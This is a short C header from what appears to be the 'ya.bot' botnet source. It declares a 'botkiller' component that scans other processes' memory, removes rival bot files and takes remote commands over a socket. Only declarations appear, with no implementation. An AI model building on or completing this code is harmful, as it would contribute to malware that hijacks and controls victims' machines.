/*  ya.bot  */

#ifndef NO_BOTKILLER
DWORD WINAPI botkiller_main(LPVOID param);
bool botkiller_memscan(DWORD dwPID, char *pszBuffer, DWORD dwSize);
int botkiller_removebot(char *pszFileName, LPVOID param);

typedef struct SBotKiller
{
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SBotKiller;
#endif